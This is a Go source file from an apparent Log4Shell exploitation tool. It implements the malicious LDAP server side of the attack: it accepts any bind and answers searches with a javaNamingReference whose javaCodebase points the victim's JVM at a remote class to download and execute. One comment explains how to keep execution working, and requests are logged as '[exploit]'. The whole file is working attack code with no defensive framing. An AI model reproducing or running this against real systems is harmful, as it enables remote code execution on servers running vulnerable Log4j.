package log4shell

import (
	"log"

	"github.com/For-ACGN/ldapserver"
	"github.com/lor00x/goldap/message"
)

type ldapHandler struct {
	logger *log.Logger

	codeBase string
}

func (h *ldapHandler) handleBind(w ldapserver.ResponseWriter, _ *ldapserver.Message) {
	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func (h *ldapHandler) handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Message) {
	req := m.GetSearchRequest()
	dn := string(req.BaseObject())

	// the last "/" about attr can't be deleted, otherwise
	// java will not execute the downloaded class.
	addr := m.Client.Addr()
	h.logger.Printf("[exploit] %s search java class \"%s\"", addr, dn)

	res := ldapserver.NewSearchResultEntry(dn)
	res.AddAttribute("objectClass", "javaNamingReference")
	res.AddAttribute("javaClassName", message.AttributeValue(dn))
	res.AddAttribute("javaFactory", message.AttributeValue(dn))
	res.AddAttribute("javaCodebase", message.AttributeValue(h.codeBase))
	w.Write(res)

	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(done)
}
